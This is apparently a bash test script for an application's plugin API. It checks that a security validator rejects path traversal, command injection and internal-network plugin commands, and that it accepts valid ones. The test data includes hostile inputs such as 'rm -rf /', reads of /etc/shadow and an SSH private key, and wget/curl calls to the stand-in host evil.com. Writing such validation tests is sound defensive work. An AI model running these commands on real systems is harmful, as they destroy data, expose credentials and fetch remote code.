#!/bin/bash

echo "🧪 Testing Plugin Command Validation"
echo "==================================="

# Start the application
echo "📦 Starting application..."
./midsommar &
APP_PID=$!
sleep 3

# Function to test plugin creation with different commands
test_plugin_command() {
    local test_name="$1"
    local command="$2"
    local should_succeed="$3"

    echo "🔍 Testing: $test_name"
    echo "   Command: $command"

    response=$(curl -s -X POST http://localhost:8080/api/v1/plugins \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer test-token" \
        -d "{
            \"name\": \"Test Plugin\",
            \"slug\": \"test-plugin-$(date +%s)\",
            \"description\": \"Test plugin for validation\",
            \"command\": \"$command\",
            \"hook_type\": \"pre_auth\",
            \"is_active\": true
        }")

    if echo "$response" | grep -q "Security Validation Failed" || echo "$response" | grep -q "🔒 SECURITY"; then
        if [ "$should_succeed" = "false" ]; then
            echo "   ✅ PASS: Malicious command blocked as expected"
            echo "   📋 Response: $(echo "$response" | jq -r '.errors[0].detail' 2>/dev/null || echo "$response")"
        else
            echo "   ❌ FAIL: Valid command was blocked"
        fi
    else
        if [ "$should_succeed" = "true" ]; then
            echo "   ✅ PASS: Valid command accepted"
        else
            echo "   ❌ FAIL: Malicious command was accepted!"
            echo "   📋 Response: $response"
        fi
    fi
    echo ""
}

# Wait for application to start
sleep 2

echo "📊 Running validation tests..."
echo ""

# Test path traversal attacks
test_plugin_command "Path Traversal 1" "file://../../../etc/passwd" "false"
test_plugin_command "Path Traversal 2" "file://./../../home/user/.ssh/id_rsa" "false"
test_plugin_command "Path Traversal 3" "/usr/bin/../../../etc/shadow" "false"

# Test command injection
test_plugin_command "Command Injection 1" "/usr/bin/plugin; rm -rf /" "false"
test_plugin_command "Command Injection 2" "/usr/bin/plugin | cat /etc/passwd" "false"
test_plugin_command "Command Injection 3" "/usr/bin/plugin && wget http://evil.com/malware" "false"
test_plugin_command "Command Injection 4" "/usr/bin/plugin \$(curl evil.com)" "false"

# Test internal network access
test_plugin_command "Internal IP 1" "grpc://127.0.0.1:8080/plugin" "false"
test_plugin_command "Internal IP 2" "http://192.168.1.1/plugin" "false"
test_plugin_command "Internal IP 3" "https://10.0.0.1:9090/api" "false"
test_plugin_command "Localhost" "grpc://localhost:3000/service" "false"

# Test invalid URL schemes
test_plugin_command "Invalid Scheme 1" "ftp://example.com/plugin" "false"
test_plugin_command "Invalid Scheme 2" "ssh://user@server/plugin" "false"

# Test valid commands that should pass
test_plugin_command "Valid Binary 1" "/usr/bin/my-plugin" "true"
test_plugin_command "Valid Binary 2" "/bin/plugin-runner" "true"
test_plugin_command "Valid OCI 1" "oci://registry.example.com/plugins/auth-plugin:v1.0" "true"
test_plugin_command "Valid gRPC" "grpc://external-service.example.com:443/plugin" "true"
test_plugin_command "Valid File" "file://./plugins/my-plugin" "true"

echo "🔧 Cleanup..."
kill $APP_PID 2>/dev/null
wait $APP_PID 2>/dev/null

echo "✨ Plugin validation tests completed!"